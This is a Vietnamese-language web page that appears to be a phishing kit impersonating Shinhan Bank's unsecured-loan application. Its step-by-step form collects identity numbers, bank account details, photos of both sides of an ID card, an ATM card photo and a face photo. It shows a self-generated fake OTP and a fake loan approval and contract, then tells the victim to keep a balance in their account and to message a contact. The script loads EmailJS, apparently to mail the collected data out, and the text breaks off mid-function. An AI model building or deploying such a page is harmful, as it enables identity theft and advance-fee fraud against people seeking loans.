                        <!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font chữ hiện đại (Roboto) -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <!-- EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f5f7fa;
        }
        .header {
            background-color: #003087;
            color: white;
            padding: 20px;
            text-align: center;
            border-bottom: 5px solid #00205B;
        }
        .header img {
            max-width: 200px;
            height: auto;
            transition: transform 0.3s;
        }
        .header img:hover {
            transform: scale(1.05);
        }
        .container {
            max-width: 900px;
            margin: 30px auto;
            padding: 30px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.5s ease-in;
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            max-width: 150px;
            height: auto;
            transition: transform 0.3s;
        }
        .form-logo img:hover {
            transform: scale(1.05);
        }
        .form-label {
            font-weight: 500;
            color: #333;
        }
        .form-control, .form-select {
            border-radius: 5px;
            border: 1px solid #ced4da;
            padding: 10px;
            font-size: 16px;
        }
        .form-control:focus, .form-select:focus {
            border-color: #003087;
            box-shadow: 0 0 5px rgba(0, 48, 135, 0.3);
        }
        .file-upload-box {
            border: 1px dashed #ced4da;
            border-radius: 5px;
            padding: 15px;
            text-align: center;
            margin-bottom: 10px;
        }
        .file-upload-box input {
            display: none;
        }
        .file-upload-box label {
            cursor: pointer;
            color: #003087;
            font-weight: 500;
        }
        .file-info {
            font-size: 14px;
            color: #666;
            margin-top: 5px;
        }
        .preview-section {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        .preview-section img {
            max-width: 150px;
            max-height: 150px;
            object-fit: contain;
            margin: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            image-rendering: -webkit-optimize-contrast; /* Đảm bảo ảnh sắc nét */
        }
        .btn-primary {
            background-color: #003087;
            border-color: #003087;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-primary:hover {
            background-color: #00205B;
            border-color: #00205B;
        }
        .btn-primary:disabled {
            background-color: #6c757d;
            border-color: #6c757d;
            cursor: not-allowed;
        }
        .btn-secondary {
            background-color: #6c757d;
            border-color: #6c757d;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-secondary:hover {
            background-color: #5a6268;
            border-color: #5a6268;
        }
        .btn-messenger {
            background-color: #0084FF;
            border-color: #0084FF;
            color: white;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-messenger:hover {
            background-color: #006DD9;
            border-color: #006DD9;
        }
        .btn-copy {
            background-color: #28a745;
            border-color: #28a745;
            color: white;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-copy:hover {
            background-color: #218838;
            border-color: #218838;
        }
        .otp-display {
            background-color: #e7f3ff;
            border: 1px solid #b8daff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        .otp-display p {
            margin: 0;
            font-size: 18px;
            font-weight: 700;
            color: #003087;
        }
        .otp-input {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .otp-input input {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ced4da;
            border-radius: 5px;
        }
        .otp-input input:focus {
            border-color: #003087;
            box-shadow: 0 0 5px rgba(0, 48, 135, 0.3);
        }
        .image-section canvas {
            width: 100%;
            max-width: 720px;
            margin: 20px auto;
            display: block;
            border: 2px solid #e9ecef;
            border-radius: 8px;
        }
        .hidden {
            display: none;
        }
        .modal-content {
            border: none;
            border-radius: 10px;
        }
        .modal-header {
            background-color: #003087;
            color: white;
            border-bottom: none;
            padding: 20px;
            display: flex;
            align-items: center;
        }
        .modal-body {
            text-align: center;
            padding: 30px;
        }
        .modal-body h5 {
            color: #003087;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .modal-body p {
            color: #555;
            font-size: 16px;
        }
        .modal-footer {
            border-top: none;
            padding: 20px;
            justify-content: center;
        }
        .step-title {
            color: #003087;
            font-weight: 700;
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center;
        }
        .step-description {
            color: #666;
            font-size: 16px;
            text-align: center;
            margin-bottom: 30px;
        }
        .spinner-border {
            width: 3rem;
            height: 3rem;
            border-width: 0.4em;
        }
        .info-box {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }
        .info-box p {
            margin: 0;
            color: #333;
            font-size: 16px;
        }
        .confirmation-box {
            background-color: #e7f3ff;
            border: 1px solid #b8daff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        .confirmation-box p {
            margin: 0;
            color: #003087;
            font-size: 16px;
            font-weight: 500;
        }
        .terms-box {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .terms-box img {
            width: 28px;
            height: 28px;
        }
        .terms-box p {
            margin: 0;
            color: #666;
            font-size: 14px;
        }
        .footer {
            background-color: #003087;
            color: white;
            padding: 20px;
            text-align: center;
            margin-top: 30px;
            border-top: 5px solid #00205B;
        }
        .footer p {
            margin: 0;
            font-size: 14px;
        }
        .footer img.lock-icon {
            width: 24px;
            vertical-align: middle;
            margin-right: 5px;
        }
        .footer img.footer-logo {
            max-width: 130px;
            height: auto;
            transition: transform 0.3s;
        }
        .footer img.footer-logo:hover {
            transform: scale(1.05);
        }
        .modal-header img {
            width: 30px;
            margin-right: 10px;
        }
        .step10-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .step10-logo img {
            max-width: 150px;
            height: auto;
            transition: transform 0.3s;
        }
        .step10-logo img:hover {
            transform: scale(1.05);
        }
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1055;
        }
        .progress-bar-container {
            margin-bottom: 20px;
        }
        .progress-bar {
            height: 10px;
            background-color: #e9ecef;
            border-radius: 5px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background-color: #003087;
            transition: width 0.3s ease-in-out;
        }
        .celebration-gif {
            max-width: 200px;
            margin: 20px auto;
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        @media (max-width: 576px) {
            .otp-input input {
                width: 35px;
                height: 35px;
                font-size: 16px;
            }
            .container {
                padding: 15px;
            }
            .header img {
                max-width: 150px;
            }
            .form-logo img, .step10-logo img {
                max-width: 120px;
            }
            .footer img.footer-logo {
                max-width: 100px;
            }
            .preview-section img {
                max-width: 100px;
                max-height: 100px;
            }
            .celebration-gif {
                max-width: 150px;
            }
            .image-section canvas {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <!-- Toast Container -->
    <div class="toast-container">
        <div id="emailToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-autohide="true" data-bs-delay="5000">
            <div class="toast-header">
                <strong class="me-auto">Thông báo</strong>
                <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
            </div>
            <div class="toast-body"></div>
        </div>
    </div>

    <!-- Header -->
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/200x50?text=Logo+Shinhan'">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <!-- Main Content -->
    <div class="container">
        <!-- Progress Bar -->
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
            </div>
        </div>

        <!-- Bước 1: Đăng ký hồ sơ -->
        <div id="step1">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
            <p class="step-description">
                Vui lòng cung cấp thông tin cá nhân để chúng tôi tiến hành xét duyệt.
            </p>
            <form id="registerForm">
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên</label>
                    <input type="text" class="form-control" id="fullName" placeholder="Nhập họ và tên" required>
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD</label>
                    <input type="text" class="form-control" id="idNumber" placeholder="Nhập số CMND/CCCD" required>
                </div>
                <div class="mb-3">
                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD</label>
                    <input type="text" class="form-control" id="idIssueDate" placeholder="Nhập ngày cấp (DD/MM/YYYY)">
                </div>
                <div class="mb-3">
                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD</label>
                    <input type="text" class="form-control" id="idIssuePlace" placeholder="Nhập nơi cấp">
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ Thường Trú</label>
                    <input type="text" class="form-control" id="address" placeholder="Nhập địa chỉ thường trú">
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp</label>
                    <select class="form-select" id="occupation">
                        <option value="" disabled selected>Chọn nghề nghiệp</option>
                        <option value="nhanvien">Nhân viên văn phòng</option>
                        <option value="kinhdoanh">Kinh doanh tự do</option>
                        <option value="giaovien">Giáo viên</option>
                        <option value="congnhan">Công nhân</option>
                        <option value="kysu">Kỹ sư</option>
                        <option value="bacsi">Bác sĩ</option>
                        <option value="banhang">Nhân viên bán hàng</option>
                        <option value="laixe">Lái xe</option>
                        <option value="noitro">Nội trợ</option>
                        <option value="sinhvien">Sinh viên</option>
                        <option value="khac">Khác</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND)</label>
                    <input type="text" class="form-control" id="income" placeholder="Nhập thu nhập hàng tháng">
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại</label>
                    <input type="tel" class="form-control" id="phoneNumber" placeholder="Nhập số điện thoại" required>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email</label>
                    <input type="email" class="form-control" id="email" placeholder="Nhập email" required>
                </div>
                <div class="mb-3">
                    <label for="loanAmount" class="form-label">Số Tiền Vay (VND)</label>
                    <select class="form-select" id="loanAmount" required>
                        <option value="" disabled selected>Chọn số tiền vay</option>
                        <option value="10000000">10,000,000</option>
                        <option value="15000000">15,000,000</option>
                        <option value="20000000">20,000,000</option>
                        <option value="25000000">25,000,000</option>
                        <option value="30000000">30,000,000</option>
                        <option value="40000000">40,000,000</option>
                        <option value="50000000">50,000,000</option>
                        <option value="60000000">60,000,000</option>
                        <option value="70000000">70,000,000</option>
                        <option value="80000000">80,000,000</option>
                        <option value="90000000">90,000,000</option>
                        <option value="100000000">100,000,000</option>
                        <option value="150000000">150,000,000</option>
                        <option value="200000000">200,000,000</option>
                        <option value="300000000">300,000,000</option>
                        <option value="400000000">400,000,000</option>
                        <option value="500000000">500,000,000</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Số Tháng Vay</label>
                    <select class="form-select" id="loanTerm" required>
                        <option value="" disabled selected>Chọn số tháng vay</option>
                        <option value="6">6 tháng</option>
                        <option value="12">12 tháng</option>
                        <option value="18">18 tháng</option>
                        <option value="24">24 tháng</option>
                        <option value="36">36 tháng</option>
                        <option value="48">48 tháng</option>
                        <option value="60">60 tháng</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
                    <select class="form-select" id="loanPurpose">
                        <option value="" disabled selected>Chọn mục đích vay</option>
                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                        <option value="Mua xe">Mua xe</option>
                        <option value="Học tập">Học tập</option>
                        <option value="Vay tiêu dùng">Vay tiêu dùng</option>
                        <option value="Khác">Khác</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng</label>
                    <input type="text" class="form-control" id="accountNumber" placeholder="Nhập số tài khoản ngân hàng">
                </div>
                <div class="mb-3">
                    <label for="bankName" class="form-label">Tên Ngân Hàng Nhận Tiền</label>
                    <input type="text" class="form-control" id="bankName" placeholder="Nhập tên ngân hàng nhận tiền">
                </div>
                <div class="mb-3">
                    <div class="terms-box">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock'">
                        <p>
                            Thông tin của bạn sẽ được bảo mật tuyệt đối theo chính sách bảo mật của Shinhan Bank. Vui lòng đọc kỹ <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Điều khoản và Điều kiện</a> trước khi tiếp tục.
                        </p>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="termsAgree">
                        <label class="form-check-label" for="termsAgree">
                            Tôi đồng ý với các điều khoản và điều kiện của Shinhan Bank.
                        </label>
                    </div>
                </div>
                <!-- Preview Section for Profile, Contract, and Disbursement Images -->
                <div class="preview-section" id="previewSection">
                    <h6>Xem trước hình ảnh</h6>
                    <div id="profileImagePreview">
                        <!-- Không hiển thị dòng chữ mặc định -->
                    </div>
                    <div id="contractImagePreview">
                        <!-- Không hiển thị dòng chữ mặc định -->
                    </div>
                    <div id="disbursementImagePreview">
                        <!-- Không hiển thị dòng chữ mặc định -->
                    </div>
                </div>
                <div class="text-center mt-3">
                    <button type="button" id="proceedToStep2Btn" class="btn btn-primary w-100">Tiếp Tục</button>
                </div>
            </form>
        </div>

        <!-- Bước 2: Tải lên giấy tờ (CMND/CCCD) -->
        <div id="step2" class="hidden">
            <h5 class="step-title">Tải Lên Giấy Tờ (CMND/CCCD)</h5>
            <p class="step-description">
                Vui lòng tải lên hình ảnh CMND/CCCD để hoàn tất hồ sơ đăng ký.
            </p>
            <div class="mb-3">
                <label for="idFrontImage" class="form-label">Hình Ảnh CMND/CCCD (Mặt Trước)</label>
                <div class="file-upload-box">
                    <label for="idFrontImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="idFrontImage" accept="image/jpeg,image/png" capture="environment" required>
                    <div class="file-info" id="idFrontInfo"></div>
                </div>
                <div class="invalid-feedback">
                    Vui lòng tải lên hình ảnh mặt trước CMND/CCCD.
                </div>
            </div>
            <div class="mb-3">
                <label for="idBackImage" class="form-label">Hình Ảnh CMND/CCCD (Mặt Sau)</label>
                <div class="file-upload-box">
                    <label for="idBackImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="idBackImage" accept="image/jpeg,image/png" capture="environment" required>
                    <div class="file-info" id="idBackInfo"></div>
                </div>
                <div class="invalid-feedback">
                    Vui lòng tải lên hình ảnh mặt sau CMND/CCCD.
                </div>
            </div>
            <div class="text-center mt-3">
                <button id="backToStep1Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <button id="proceedToStep3Btn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 3: Tải lên thẻ ATM -->
        <div id="step3" class="hidden">
            <h5 class="step-title">Tải Lên Thẻ ATM</h5>
            <p class="step-description">
                Vui lòng tải lên hoặc chụp hình ảnh thẻ ATM để hoàn tất hồ sơ đăng ký.
            </p>
            <div class="mb-3">
                <label for="atmImage" class="form-label">Hình Ảnh Thẻ ATM</label>
                <div class="file-upload-box">
                    <label for="atmImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="atmImage" accept="image/jpeg,image/png" capture="environment" required>
                    <div class="file-info" id="atmImageInfo"></div>
                </div>
                <div class="invalid-feedback">
                    Vui lòng tải lên hình ảnh thẻ ATM.
                </div>
            </div>
            <div class="text-center mt-3">
                <button id="backToStep2Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <button id="proceedToStep4Btn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 4: Chụp khuôn mặt -->
        <div id="step4" class="hidden">
            <h5 class="step-title">Xác Minh Khuôn Mặt</h5>
            <p class="step-description">
                Vui lòng chụp ảnh khuôn mặt hoặc tải lên hình ảnh để xác minh danh tính.
            </p>
            <div class="mb-3">
                <label for="faceImage" class="form-label">Hình Ảnh Khuôn Mặt</label>
                <div class="file-upload-box">
                    <label for="faceImage">Chụp ảnh hoặc chọn tệp</label>
                    <input type="file" id="faceImage" accept="image/jpeg,image/png" capture="user" required>
                    <div class="file-info" id="faceImageInfo"></div>
                </div>
                <div class="invalid-feedback">
                    Vui lòng chụp hoặc tải lên hình ảnh khuôn mặt.
                </div>
            </div>
            <div class="text-center mt-3">
                <button id="backToStep3Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <button id="proceedToOtpBtn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 5: Xác nhận danh tính bằng OTP -->
        <div id="step5" class="hidden">
            <h5 class="step-title">Xác Nhận Danh Tính</h5>
            <p class="step-description">
                Vui lòng nhập mã OTP được hiển thị để xác minh danh tính.
            </p>
            <div class="otp-display">
                <p id="otpDisplay">------</p>
                <button type="button" class="btn btn-copy" onclick="copyOtp()">Sao Chép</button>
            </div>
            <div class="otp-input">
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp1" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp2" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp3" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp4" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp5" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="otp6" required>
            </div>
            <div class="text-center">
                <button id="backToStep4Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <button id="verifyOtpBtn" class="btn btn-primary">Xác Nhận OTP</button>
            </div>
        </div>

        <!-- Bước 6: Quá trình xét duyệt -->
        <div id="step6" class="hidden">
            <h5 class="step-title">Đang Xét Duyệt Hồ Sơ</h5>
            <p class="step-description">
                Hệ thống đang xử lý hồ sơ của bạn. Vui lòng chờ trong giây lát.
            </p>
            <div class="text-center">
                <div class="spinner-border text-primary" role "status">
                    <span class="visually-hidden">Đang tải...</span>
                </div>
            </div>
            <div class="text-center mt-3">
                <button id="backToStep5Btn" class="btn btn-secondary me-2">Quay Lại</button>
            </div>
        </div>

        <!-- Bước 7: Thông báo duyệt hồ sơ -->
        <div id="step7" class="hidden">
            <h5 class="step-title">Hồ Sơ Được Duyệt</h5>
            <p class="step-description">
                Chúc mừng! Hồ sơ vay tín chấp của bạn đã được duyệt.
            </p>
            <div class="confirmation-box">
                <p id="confirmationMessage"></p>
                <p>Thông tin chi tiết đã được gửi đến email: <span id="confirmationEmail"></span></p>
            </div>
            <div class="text-center">
                <button id="backToStep6Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <button id="proceedToContractBtn" class="btn btn-primary">Xem Hợp Đồng</button>
            </div>
        </div>

        <!-- Bước 8: Hiển thị hợp đồng -->
        <div id="step8" class="hidden">
            <h5 class="step-title">Xem Hợp Đồng</h5>
            <p class="step-description">
                Dưới đây là hợp đồng vay tín chấp của bạn. Vui lòng kiểm tra kỹ thông tin.
            </p>
            <div class="image-section">
                <canvas id="contractCanvas"></canvas>
            </div>
            <div class="text-center">
                <button id="backToStep7Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <button id="proceedToSignContractBtn" class="btn btn-primary">Ký Hợp Đồng</button>
            </div>
        </div>

        <!-- Bước 8.1: Ký hợp đồng bằng OTP -->
        <div id="step8-1" class="hidden">
            <h5 class="step-title">Ký Hợp Đồng</h5>
            <p class="step-description">
                Vui lòng nhập mã OTP để xác nhận ký hợp đồng.
            </p>
            <div class="otp-display">
                <p id="signOtpDisplay">------</p>
                <button type="button" class="btn btn-copy" onclick="copySignOtp()">Sao Chép</button>
            </div>
            <div class="otp-input">
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp1" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp2" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp3" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp4" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp5" required>
                <input type="text" maxlength="1" class="form-control otp-digit" id="signOtp6" required>
            </div>
            <div class="text-center">
                <button id="backToStep8Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <button id="verifySignOtpBtn" class="btn btn-primary">Xác Nhận OTP</button>
            </div>
        </div>

        <!-- Bước 9: Điều kiện giải ngân -->
        <div id="step9" class="hidden">
            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
            <p class="step-description">
                Vui lòng xem các điều kiện giải ngân dưới đây.
            </p>
            <div class="image-section">
                <canvas id="disbursementCanvas"></canvas>
            </div>
            <div class="text-center">
                <button id="backToStep8-1Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <button id="proceedToFinalStepBtn" class="btn btn-primary">Hoàn Tất</button>
            </div>
        </div>

        <!-- Bước 10: Hoàn tất -->
        <div id="step10" class="hidden">
            <div class="step10-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Hoàn Tất Đăng Ký</h5>
            <p class="step-description">
                Cảm ơn bạn đã đăng ký vay tín chấp tại Shinhan Bank. Vui lòng thực hiện các bước tiếp theo để nhận khoản vay.
            </p>
            <div class="info-box">
                <p>
                    Vui lòng duy trì số dư tài khoản để đảm bảo giải ngân thành công. Nếu có thắc mắc, hãy liên hệ với chúng tôi qua Messenger.
                </p>
            </div>
            <div class="text-center">
                <button id="backToStep9Btn" class="btn btn-secondary me-2">Quay Lại</button>
                <a href="https://m.me/ShinhanBankVietnam" target="_blank" class="btn btn-messenger">Liên Hệ Messenger</a>
            </div>
        </div>

        <!-- Modal Điều khoản -->
        <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/30x30?text=Lock'">
                        <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <h5>Chính Sách Bảo Mật</h5>
                        <p>
                            Shinhan Bank cam kết bảo mật thông tin cá nhân của bạn theo quy định pháp luật Việt Nam. Thông tin của bạn sẽ chỉ được sử dụng để xử lý hồ sơ vay và sẽ không được chia sẻ với bên thứ ba mà không có sự đồng ý của bạn.
                        </p>
                        <h5>Điều Kiện Vay</h5>
                        <p>
                            - Độ tuổi: Từ 20 đến 60 tuổi.<br>
                            - Thu nhập tối thiểu: 5,000,000 VND/tháng.<br>
                            - Không có nợ xấu tại thời điểm đăng ký.
                        </p>
                        <h5>Trách Nhiệm của Khách Hàng</h5>
                        <p>
                            Khách hàng cần cung cấp thông tin chính xác và chịu trách nhiệm về tính xác thực của các tài liệu cung cấp.
                        </p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal thông báo duyệt -->
        <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="successModalLabel">Chúc Mừng!</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Hồ sơ vay tín chấp của bạn đã được duyệt thành công!</p>
                        <p id="modalFullName"></p>
                        <p id="modalLoanAmount"></p>
                        <p id="modalLoanCode"></p>
                        <p>Thông tin chi tiết đã được gửi đến email của bạn.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="proceedToContract()">Tiếp Tục</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal chúc mừng với ảnh động -->
        <div class="modal fade" id="celebrationModal" tabindex="-1" aria-labelledby="celebrationModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="celebrationModalLabel">Chúc Mừng!</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <img src="https://media.giphy.com/media/3o6Zta4x8M5a1zF7yM/giphy.gif" alt="Celebration GIF" class="celebration-gif" onerror="this.src='https://via.placeholder.com/200x200?text=Celebration'">
                        <p id="celebrationMessage"></p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="proceedToStep(6, 7, 70)">Tiếp Tục</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock'">
            <p>
                © 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a5969095958a9791a5968d8c8b8d848bcb868a88cb938b">[email protected]</a>
            </p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/130x50?text=Logo+Shinhan'">
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Script xử lý form và gửi email -->
    <script>
        // Khởi tạo EmailJS với public key
        (function() {
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        // Hàm hiển thị toast
        function showToast(message, isSuccess = true) {
            try {
                const toast = document.getElementById('emailToast');
                const toastBody = toast.querySelector('.toast-body');
                toastBody.textContent = message;
                toast.classList.remove('bg-success', 'bg-danger');
                toast.classList.add(isSuccess ? 'bg-success' : 'bg-danger');
                const bsToast = new bootstrap.Toast(toast);
                bsToast.show();
            } catch (error) {
                console.error("Lỗi hiển thị toast:", error);
            }
        }

        // Định nghĩa formData với URL hình ảnh và fallback
        let formData = {
            contractImage: "https://vaytieudung.github.io/shinhanbank/assets/img/contract_image.png",
            disbursementImage: "https://vaytieudung.github.io/shinhanbank/assets/img/disbursement_image.png",
            fallbackImage: "https://via.placeholder.com/720x1018?text=Hinh+Anh+Mac+Dinh",
            fallbackProfileImage: "https://via.placeholder.com/150x150?text=Anh+Ho+So"
        };

        // Dữ liệu người đăng ký
        let userData = {};

        // Hàm lưu dữ liệu vào localStorage
        function saveToLocalStorage(step) {
            try {
                userData.currentStep = step;
                localStorage.setItem('userData', JSON.stringify(userData));
            } catch (error) {
                console.error("Lỗi lưu localStorage:", error);
                showToast("Lỗi lưu dữ liệu. Vui lòng thử lại!", false);
            }
        }

        // Hàm cập nhật preview section
        function updatePreviewSection() {
            try {
                if (userData.currentStep >= 4 && userData.faceImageUrl) {
                    $('#profileImagePreview').html(`<img src="${userData.faceImageUrl}" alt="Hình ảnh khuôn mặt" />`);
                } else {
                    $('#profileImagePreview').html('');
                }
                if (userData.currentStep >= 8 && userData.contractImageUrl) {
                    $('#contractImagePreview').html(`<img src="${userData.contractImageUrl}" alt="Hình ảnh hợp đồng" />`);
                } else {
                    $('#contractImagePreview').html('');
                }
                if (userData.currentStep >= 9 && userData.disbursementImageUrl) {
                    $('#disbursementImagePreview').html(`<img src="${userData.disbursementImageUrl}" alt="Hình ảnh điều kiện giải ngân" />`);
                } else {
                    $('#disbursementImagePreview').html('');
                }
            } catch (error) {
                console.error("Lỗi cập nhật preview section:", error);
                $('#profileImagePreview').html('');
                $('#contractImagePreview').html('');
                $('#disbursementImagePreview').html('');
            }
        }

        // Hàm chuyển bước
        function proceedToStep(currentStep, nextStep, progress) {
            try {
                $(`#step${currentStep}`).addClass('hidden');
                $(`#step${nextStep}`).removeClass('hidden');
                $('#progressBar').css('width', `${progress}%`);
                saveToLocalStorage(nextStep);
                updatePreviewSection();
